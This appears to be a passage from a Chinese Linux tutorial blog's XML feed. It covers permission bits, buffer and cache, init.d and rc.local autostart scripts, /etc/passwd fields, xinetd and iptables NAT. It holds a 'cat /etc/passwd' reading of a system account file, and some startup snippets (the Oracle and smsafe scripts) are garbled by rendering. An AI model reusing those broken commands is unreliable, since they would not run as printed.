位，如果该位为 1，则表示设置 setgid c - sticky 位，如果该位为 1，则表示设置 sticky &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也就是说，如果有特殊权限是，第一位数字可以是 0，1（–t），2（-s-），3（-st），4（s–），5（s-t），6（ss-），7（sst） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置完这些标志后，可以用 ls l 来查看。如果有这些标志，则会在原来的执行标志位置上显示。如： 123rwsrw-r-- 表示有setuid标志rwxrwsrw- 表示有setgid标志rwxrw-rwt 表示有sticky标志 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么原来的执行标志 x ，系统是这样规定的。如果本来该为上有 x ，则这些特殊表示显示为小写字母（s ，s ，t）。否则，显示为大写字母（S , S ,T）]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详细说明Buffer和Cache的区别]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F52.%20%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8EBuffer%E5%92%8CCache%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[详细说明Buffer和Cache的区别&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缓存（cached）是把读取过的数据保存起来，重新读取时若命中（找到需要的数据）就不要去读硬盘了，若没有命中就读硬盘。其中的数据会根据读取频率进行组织，把最频繁读取的内容放在最容易找到的位置，把不再读的内容不断往后排，直至从中删除。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缓存（cache）实际并不是缓冲文件的，而是缓冲块的，块是磁盘I/O操作的最小单元。这样，目录、超级块、其它文件系统的薄记数据以及非文件系统的磁盘数据都可以被缓冲了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果缓存有固定的大小，那么缓存太大了也不好，因为这会使得空闲的内存太小而导致进行交换操作（这同样是慢的）。为了最有效地使用实际内存，Linux自动地使用所有空闲的内存作为高速缓冲，当程序需要更多的内存时，它也会自动地减小缓冲的大小。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缓冲（buffers）是根据磁盘的读写设计的，把分散的写操作集中进行，减少磁盘碎片和硬盘的反复寻道，从而提高系统性能。linux有一个守护进程定期清空缓冲内容（即写磁盘），也可以通过sync命令手动清空缓冲。举个例子吧：我这里有一个ext2的U盘，我往里面cp一个3M的 MP3，但U盘的灯没有跳动，过了一会儿（或者手动输入sync）U盘的灯就跳动起来了。卸载设备时会清空缓冲，所以有些时候卸载一个设备时要等上几秒钟。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两者都是RAM中的数据。简单来说，buffer是即将要被写入磁盘的，而cache是被从磁盘中读出来的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;buffer是由各种进程分配的，由进程和系统一起管理.被用在如输入队列等方面，一个简单的例子如某个进程要求有多个字段读入，在所有字段被读入完整之前，进程把先前读入的字段放在buffer中保存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cache经常被用在磁盘的I/O请求上，如果有多个进程都要访问某个文件，于是该文件便被做成cache以方便下次被访问，这样可提供系统性能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;综上所述可以理解为cache系统管理, buffer由进程和系统一起管理.]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rc.local自启动学习]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F63.%20rc.local%E8%87%AA%E5%90%AF%E5%8A%A8%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[rc.local自启动学习&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux有自己一套完整的启动体系，抓住了linux启动的脉络，linux的启动过程将不再神秘。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本文中假设inittab中设置的init tree为： /etc/rc.d/rc0.d /etc/rc.d/rc1.d /etc/rc.d/rc2.d /etc/rc.d/rc3.d /etc/rc.d/rc4.d /etc/rc.d/rc5.d /etc/rc.d/rc6.d /etc/rc.d/init.d 1. 关于linux的启动&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;init是所有进程的顶层 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;init读取/etc/inittab，执行rc.sysinit脚本(注意文件名是不一定的,有些unix甚至会将语句直接写在inittab中) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rc.sysinit脚本作了很多工作: 1234567init $PATHconfig networkstart swap functionset hostnamecheck root file system, repair if neededcheck root space.... &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rc.sysinit根据inittab执行rc?.d脚本 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux是多用户系统，getty是多用户与单用户的分水岭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在getty之前运行的是系统脚本 2. 关于rc.d&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所有启动脚本放置在 /etc/rc.d/init.d下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rc?.d中放置的是init.d中脚本的链接，命名格式是: 12S&#123;number&#125;&#123;name&#125;K&#123;number&#125;&#123;name&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;S开始的文件向脚本传递start参数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;K开始的文件向脚本传递stop参数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;number决定执行的顺序 3. 启动脚本示例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是一个用来启动httpd的 /etc/rc.d/init.d/apache 脚本： 12#!/bin/bash...... &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看出他接受start,stop,restart,status参数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后可以这样建立rc?.d的链接： 12345678cd /etc/rc.d/init.d &amp;&amp;ln -sf ../init.d/apache ../rc0.d/K28apache &amp;&amp;ln -sf ../init.d/apache ../rc1.d/K28apache &amp;&amp;ln -sf ../init.d/apache ../rc2.d/K28apache &amp;&amp;ln -sf ../init.d/apache ../rc3.d/S32apache &amp;&amp;ln -sf ../init.d/apache ../rc4.d/S32apache &amp;&amp;ln -sf ../init.d/apache ../rc5.d/S32apache &amp;&amp;ln -sf ../init.d/apache ../rc6.d/K28apache 4. 关于rc.local&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;经常使用的 rc.local 则完全是习惯问题，不是标准。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;各个发行版有不同的实现方法，可以这样实现： 12345678touch /etc/rc.d/rc.localchmod +x /etc/rc.d/rc.localln -sf /etc/rc.d/rc.local /etc/rc.d/rc1.d/S999rc.local &amp;&amp;ln -sf /etc/rc.d/rc.local /etc/rc.d/rc2.d/S999rc.local &amp;&amp;ln -sf /etc/rc.d/rc.local /etc/rc.d/rc3.d/S999rc.local &amp;&amp;ln -sf /etc/rc.d/rc.local /etc/rc.d/rc4.d/S999rc.local &amp;&amp;ln -sf /etc/rc.d/rc.local /etc/rc.d/rc5.d/S999rc.local &amp;&amp;ln -sf /etc/rc.d/rc.local /etc/rc.d/rc6.d/S999rc.local 5. 关于bash启动脚本 /etc/profile /etc/bashrc ~/.bash_profile ~/.bashrc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是bash的启动脚本 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般用来设置单用户的启动环境，也可以实现开机单用户的程序，但要明确他们都是属于bash范畴而不是系统范畴。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它们的具体作用介绍如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/bin/bash这个命令解释程序(后面简称shell)使用了一系列启动文件来建立一个运行环境： /etc/profile /etc/bashrc ~/.bash_profile ~/.bashrc ~/.bash_logout &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一个文件都有特殊的功用并对登陆和交互环境有不同的影响。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/profile 和 ~/.bash_profile 是在启动一个交互登陆shell的时候被调用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/bashrc 和 ~/.bashrc 是在一个交互的非登陆shell启动的时候被调用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;~/.bash_logout 在用户注销登陆的时候被读取 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个交互的登陆shell会在 /bin/login 成功登陆之后运行。一个交互的非登陆shell是通过命令行来运行的，如[prompt]$/bin/bash。一般一个非交互的shell出现在运行 shell脚本的时候。之所以叫非交互的shell，是因为它不在命令行上等待输入而只是执行脚本程序。 6. 关于开机程序的自动启动&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统脚本可以放置在/etc/rc.d/init.d中并建立/etc/rc.d/rc?.d链接，也可以直接放置在/etc/rc.d/rc.local中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;init.d脚本包含完整的start,stop,status,reload等参数，是标准做法，推荐使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为特定用户使用的程序（如有的用户需要使用中文输入法而有的不需要）放置在~/中的bash启动脚本中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置系统自动启动在/etc/init.d/下创建smsafe文件内容： 123456#!/bin/bash# chkconfig: 35 95 1# description: script to start/stop smsafecase 1instart)sh/opt/startsms.sh;;stop)sh/opt/stopsms.sh;;∗)echo"Usage: 0 (start|stop)";;esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改权限 1# chmod 775 smsafe &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入自动启动 1# chkconfig –add smsafe &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看自动启动设置 12# chkconfig –list smsafesmsafe 0:off 1:off 2:off 3:on 4:off 5:on 6:off &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以后可以用以下命令启动和停止脚本 12# service smsafe start 启动# service smsafe stop 停止 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;jira 的启动主要依靠的是bin目录下的catalina.sh脚本，提供了如init脚本的start，stop等参数 1234567#!/bin/bash## chkconfig: 2345 85 15# description: jira# processname: jira# source function library. /etc/init.d/functions &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面一行比较重要，为jira的安装路径，没有的话，将会提示找不到文件 12345678910111213141516171819202122232425262728293031323334CATALINA_HOME="/var/www/jira"RETVAL=0start() &#123;echo -n $"Starting jira services: ". /var/www/jira/bin/catalina.sh startRETVAL=$?echo&#125;stop() &#123;echo -n $"Shutting down jira services: ". /var/www/jira/bin/catalina.sh stopRETVAL=$?echo&#125;case "$1" instart)start;;stop)stop;;restart|reload)stopstart;;status)status jiraRETVAL=$?;;*)echo "Usage: 0 &#123;start|stop|restart|status&#125;"exit 1esacexit $RETVAL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存为/etc/init.d/jira&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后利用 12chkconfig --add jiraOK &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动 1/etc/init.d/jira start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;停止 1/etc/init.d/jira stop 以Websphere为例子 在/etc/rc.d/init.d目录下新建启动脚本startWebsphere，键入以下内容： 12#!/bin/sh/opt/WebSphere/AppServer/bin/startServer.sh server1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改该文件的权限： 1chmod 755 startWebsphere 在对应的目录下建立软连接(假设系统默认进入X11) 12cd /etc/rc.d/rc5.dln -s ../init.d/startWebsphere S99startWebsphere 重启系统即可 linux下oracle的自启动脚本 写一个StartOracle.sql,假设放在/目录下 123vi /StartOracle.sql ##加入如下两行保存startupexit 2.配置/etc/rc.local 12vi /etc/rc.local ##加入如下内容，保存su - oracle -c 'ORACLE H OME/bin/lsnrctlstart ′ su−oracle−c ′ ORACLE_HOME/bin/sqlplus "/as sysdba" @/StartOracle.sql' 如果还要自动启动oracle enterprise manager(em)和isqlplus可以如下配置 12vi /etc/rc.local ##加入su - oracle -c 'ORACLE H OME/bin/emctlstartdbconsole ′ su−oracle−c ′ ORACLE_HOME/bin/isqlplusctl start' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要知道em和isqlplus等使用的端口可以查询文件： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$ORACLE_HOME/install/portlist.ini(以oracle 10.1.0.3为例)]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 用户名文件]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F6.%20Linux%20%E7%94%A8%E6%88%B7%E5%90%8D%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Linux 用户名文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 用户名文件是 /etc/passwd 可以说是 Linux 系统中最重要的文件之一。如果这个文件出了问题，则无法正常登录 Linux 系统。 1234567891011[root@localhost ~]# cat /etc/passwd | headroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“head” 前面的 “|” 叫做管道符，它的作用是把前面的命令的输出再输入给后面的命令。 用户名文件每个字段的含义&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/passwd 由 ： 分割成 7 个字段，每个字段的含义是：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1.用户名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如第一行中的 root 就是用户名，代表用户帐号的字符串。用户名字符串可以是大小写字母、数字、减号（不能出现在首位）、点以及下划线，其他字符不合法。虽然用户名中可以出现点，但不建议使用，尤其是首位为点时，另外减号也不建议使用，因为庸医造成混淆。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.帐号口令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二字段存放的就是该帐号的口令。为什么是 ‘x’ 呢？早起的 unix 系统口令是存放在这里，但基于安全因素，后来就将其到 ‘/etc/shadow’ 中了，这里只用一个 ‘x’ 代替。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3.用户标识号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个数字代表用户标识号，也叫做 uid 。系统识别用户身份就是通过这个数字， 0 就是 root ，也就是说可以修改 test 用户的 uid 为 0 ，那么系统就会认为 root 和 test 为同一个账户。通常 uid 的取值范围是 0-65535 （但实际上已经可以支持到 4294967294），0 是超级用户 （root）的表示号，1-499 有系统保留，作为管理帐号，普通用户的表示号从 500 开始，如果自定义建立一个普通用户，可以看到该账户的标识号是大于或等于 500 的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;4.组表示号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个数字表示组标识号，也叫做 gid 这个字段对应着 /etc/group 中的一条记录，其实 /etc/group 和 /etc/passwd 基本上类似。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;5.注释说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该字段没有实际意义，通常记录该用户的一些属性，例如姓名、电话、地址等等。不过，当使用 finger 的功能时就回显示这些信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;6.用户家目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当用户登录时就处在这个目录下。 root 的家目录是 /root，普通用户的家目录则为 /home/username ，这个字段是可以自定义的，比如建立一个普通用户 test1 ，要想让 test1 的家目录在 /data 目录下，只要修改 /etc/passwd 文件中的 test1 那行中的该字段为 /data 即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;7.shell&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户登录后要启动一个进程，用来将用户下达的指令传给内核，这就是 shell 。Linux 的 shell 有很多中 sh 、csh 、ksh 、tcsh 、bash等，而 Redhat /CentOS 的 shell 就是 bash 。查看 /etc/passwd 文件，该字段中除了 /bin/bash 外还有 /sbin/nologin 比较多，它表示不允许该帐号登录。如果想建立一个帐号不让它登录，那么就可以把该字段改成 /sbin/nologin 默认是 /bin/bash。 chfn 更改用户的 finger&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 /etc/passwd 文件中的第五个字段中所显示的信息，如何去设定： 12345678910[root@localhost ~]# chfn user11Changing finger information for user11.Name []: user11Office []: user11's officeOffice Phone []: 12345678Home Phone []: 123456789Finger information changed.[root@localhost ~]# grep 'user11' /etc/passwduser11:x:510:502:user11,user11's office,12345678,123456789:/home/user11:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘chfn’ 命令可以修改用户的findger信息，比如name, office, office phone 以及 Home phone.修改完后，就会在/etc/passwd文件中的user11的那一行第五个字段中看到相关信息了，默认是空的。“grep” 命令，它是用来过滤指定关键词的行]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用xinetd管理网络应用服务]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F64.%20%E4%BD%BF%E7%94%A8xinetd%E7%AE%A1%E7%90%86%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[使用xinetd管理网路应用服务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认机器没有安装这个服务，需要安装 1yum install -y xinetd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;随着互联网的不断发展以及Linux系统的不断完善，以Linux为系统核心的网络服务器的比重正在逐年上升。从WWW服务器到目前流行的游戏服务器，绝大多数都在采用Linux作为服务平台。正是由于各种应用的不断出现和用户群的增长，基于Linux的系统应当拥有完善的安全措施，应当足够坚固、能够抵抗来自Internet的侵袭，这也正是Linux之所以流行并且成为Internet骨干力量的主要原因。一方面，Linux为用户提供了多种优质的网络服务，包括Http、Ftp、Smtp、Pop3等；另一方面，服务的增多意味着更多的风险。每种服务本身都必然存在着某些缺陷，而这些缺陷很有可能被高明的黑客利用来对系统进行攻击。所以，提供特定服务的服务器应该尽可能开放提供服务必不可少的端口，而将与服务器服务无关的服务关闭，比如：一台作为www和ftp服务器的机器，应该只开放80和25端口，而将其他无关的服务如关掉，以减少系统漏洞。本专题将着重讲述在Linux系统中如何使用xinetd机制来管理网络应用服务。 Xinetd机制介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux系统的早期版本中，有一种称为inetd的网络服务管理程序，也叫作“超级服务器”，就是监视一些网络请求的守护进程，其根据网络请求来调用相应的服务进程来处理连接请求。inetd.conf则是inetd的配置文件。inetd.conf文件告诉inetd监听哪些网络端口，为每个端口启动哪个服务。在任何的网络环境中使用Linux系统，第一件要做的事就是了解一下服务器到底要提供哪些服务。不需要的那些服务应该被禁止掉，这样黑客就少了一些攻击系统的机会，因为服务越多，意味着遭受攻击的风险越打。用户可以查看“/etc/inetd.conf”文件，了解一下inetd提供和开放了哪些服务，以根据实际情况进行相应的处理。而在Linux7.X的版本当中则使用xinetd（扩展的超级服务器）的概念对inetd进行了扩展和替代。因此本专题主要以xinetd为背景，来讲述如何增加和删除网络服务，从而有效地保证Linux系统安全。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;xinetd的默认配置文件是/etc/xinetd.conf。其语法和/etc/inetd.conf完全不同且不兼容。它本质上是/etc/inetd.conf和/etc/hosts.allow，/etc/hosts.deny功能的组合。系统默认使用xinetd的服务可以分为如下几类： 标准internet服务：http、telnet、ftp等； 信息服务：finger、netstat、systat； 邮件服务：imap、pop3、smtp； RPC服务：rquotad 、rstatd、rusersd、sprayd、walld； BSD服务：comsat、exec、login、ntalk、shell talk； 内部服务：chargen、daytime、echo等； 安全服务：irc； 其他服务：name、tftp、uucp、wu-ftp； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上述xinetd提供的服务的用途以及使用方法，用户可以查找相关的资料获得，这里不再赘述。然而，对他们有详细地了解是必不可少的，这可以帮助用户较好地确定需要或者不需要哪些网络服务功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是一个典型的/etc/xinetd.conf文件的例子： 1234567891011121314# vi xinetd.conf## Simple configuration file for xinetd## Some defaults, and include /etc/xinetd.d/defaults&#123; instances = 60 log_type = SYSLOG authpriv log_on_success = HOST PID log_on_failure = HOST cps = 25 30&#125;includedir /etc/xinetd.d &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从文件最后一行可以清楚地看到，/etc/xinetd.d目录是存放各项网络服务（包括http、ftp等）的核心目录，因而系统管理员需要对其中的配置文件进行熟悉和了解。一般说来，在/etc/xinetd.d的各个网络服务配置文件中，每一项具有下列形式： 12345678910service service-name&#123;Disabled //表明是否禁用该服务Flags //可重用标志Socket_type //TCP/IP数据流的类型，包括stream，datagram，raw等Wait //是否阻塞服务，即单线程或多线程User //服务进程的uidServer //服务器守护进程的完整路径log_on_failure //登陆错误日志记录&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中service是必需的关键字，且属性表必须用大括号括起来。每一项都定义了由service-name定义的服务。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Service-name是任意的，但通常是标准网络服务名，也可增加其他非标准的服务，只要它们能通过网络请求激活，包括localhost自身发出的网络请求。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一个service有很多可以使用的attribute，操作符可以是=，+=，或-=。所有属性可以使用=，其作用是分配一个或多个值，某些属性可以使用+=或－=的形式，其作用分别是将其值增加到某个现存的值表中，或将其值从现存值表中删除。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户应该特别注意的是：每一项用户想新添加的网络服务描述既可以追加到现有的/etc/xinetd.conf中，也可以在/etc/xinetd.conf中指定的目录中分别建立单独的文件，RedHat 7.x以上的版本都建议采用后一种做法，因为这样做的可扩充性很好，管理起来也比较方便，用户只需要添加相应服务的描述信息即可追加新的网络服务。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;RedHat 7.x默认的服务配置文件目录是/etc/xinetd.d，在该目录中使用如下命令可以看到许多系统提供的服务： 1234567891011121314151617#cd /etc/xinetd.d#lschargen cvspserver daytime-udp echo-udp ntalk qmail-pop3 rexec rsh sgi_fam telnet time-udp chargen-udp daytime echo finger pop3 qmail-smtp rlogin rsync talk time wu-ftpd然而，上述的许多服务，默认都是关闭的，看看如下文件内容：#cat telnet# default: off //表明默认该服务是关闭的# description: The telnet server serves telnet sessions; it uses \# unencrypted username/password pairs for authentication.service telnet&#123; disable = yes //表明默认该服务是关闭的 flags = REUSE socket_type = stream wait = no user = root server = /usr/sbin/in.telnetd log_on_failure += USERID 服务的开启与关闭&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般说来，用户可以使用两种办法来对网络服务进行开启与关闭。一种为通过文件直接编写进行开启与关闭；另外一种则通过用户熟悉的图形用户界面进行。下面分别进行介绍。 1.使用/etc/xinetd.d目录下的文件进行配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;针对上面列出的关于telnet的例子，用户想要开启服务，只需要通过使用vi 编辑器改写该文件为如下内容： 12345678910service telnet&#123; disable = no //将该域置为“no”，则表明开启该服务 flags = REUSE socket_type = stream wait = no user = root server = /usr/sbin/in.telnetd log_on_failure += USERID&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后，需要使用/etc/rc.d/init.d/xinetd restart来激活Telnet服务即可。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相对应的，如果用户想要关闭某个不需要的服务，则将上述的disable = no改为disable = yes即可，这样就修改了服务配置，并且再次使用/etc/rc.d/init.d/xinetd restart来启用最新的配置。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种方法使用起来相对于Windows下的图形配置方法较为复杂，用户需要对其中的每个参数都有清楚地了解，不能够随意修改，所以建议高级用户或者是有经验的用户使用。 2.使用图形用户界面进行配置：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户可以在终端下键入“setup”命令来对系统提供的服务、防火墙配置、用户授权配置、网络配置、声卡配置、打印机配置等进行全方位的配置。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户选择其中的System services进行配置即可.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户将会看到系统罗列出了anacron,apmd,autofs,chargen,telnet,http等包括我们上面所讲述的xinetd管理的网络服务在内的系统服务进程，用户通过选择这些进程，则可以开启相应的服务。而如果用户想关掉其中的某个服务，则取消选择，保存退出即可以完成配置。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而用户这样设置的结果，就相当于直接对/etc/xinetd.d相应网络服务的配置文件进行了改写，只不过使用起来更加直观和方便，且不需要用户具有比较熟练的Linux使用技巧。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同样需要注意的是，在配置好了相应的网络服务之后，需要执行/etc/rc.d/init.d/xinetd restart命令来对新的改动进行激活，那么就能够使用最新配置的服务了。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后强调用户注意的是，本文给出的使用方法使用效率的高低、正确与否，极大程度上取决于具体的应用，以及用户对各项服务理解程度的不同。希望用户在配置自己的Linux服务器之前，对各种应用服务都作深入地了解，待到根据实际的应用需求确定好需要开启和哪些网络服务之后再使用xinetd机制进行配置，切忌稀里糊涂地进行配置，反而导致产生较大的漏洞和风险。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下使用iptables实现内网的ftp端口映射]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F61.%20Linux%E4%B8%8B%E4%BD%BF%E7%94%A8iptables%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%9A%84ftp%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%2F</url>
    <content type="text"><![CDATA[Linux下使用iptables实现内网的ftp端口映射&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有两台机器，其中一台A 有内网和外网，B机器只有内网。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想达到的目的： 通过A机器的外网去访问B机器的ftp（21） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;A机器外网IP为 123.234.12.22(eth1) 内网IP为 192.168.10.20 (eth0)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;B机器内网为 192.168.10.21 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实现方法： 让你的linux支持ftp的端口转发modprobe ip_nat_ftp ,加载ip_nat_ftp模块（若没有编译进内核），以使ftp能被正确NAT&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; modprobe ip_conntrack_ftp ,加载ip_conntrack_ftp模块 在A机器上打开端口转发功能 1vi /etc/sysctl.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使 net.ipv4.ip_forward = 1 1sysctl -p 在A机器上创建iptables规则 1iptables -t nat -I PREROUTING -d 123.234.12.22 -p tcp --dport 21 -j DNAT --to 192.168.10.21:21 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把访问外网21端口的包转发到内网ftp服务器 1iptables -t nat -I POSTROUTING -d 192.168.10.21 -p tcp --dport 21 -j SNAT --to 192.168.10.20 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把到内网ftp服务器的包回源到内网网卡上，不然包只能转到ftp服务器，而返回的包不能到达客户端]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables中DNAT、SNAT、和MASQUERADE的理解]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F60.%20iptables%E4%B8%ADDNAT%E3%80%81SNAT%E3%80%81%E5%92%8CMASQUERADE%E7%9A%84%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[iptables中DNAT、SNAT、和MASQUERADE的理解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;IPtables中可以灵活的做各种网络地址转换（NAT），网络地址转换主要有两种：SNAT和DNAT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SNAT是source network address translation的缩写，即源地址目标转换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如，多个PC机使用ADSL路由器共享上网，每个PC机都配置了内网IP，PC机访问外部网络的时候，路由器将数据包的报头中的源地址替换成路由器的ip，当外部网络的服务器比如网站web服务器接到访问请求的时候，他的日志记录下来的是路由器的ip地址，而不是pc机的内网ip； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是因为，这个服务器收到的数据包的报头里边的“源地址”，已经被替换了所以叫做SNAT，基于源地址的地址转换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNAT是destination network address translation的缩写，即目标网络地址转换。 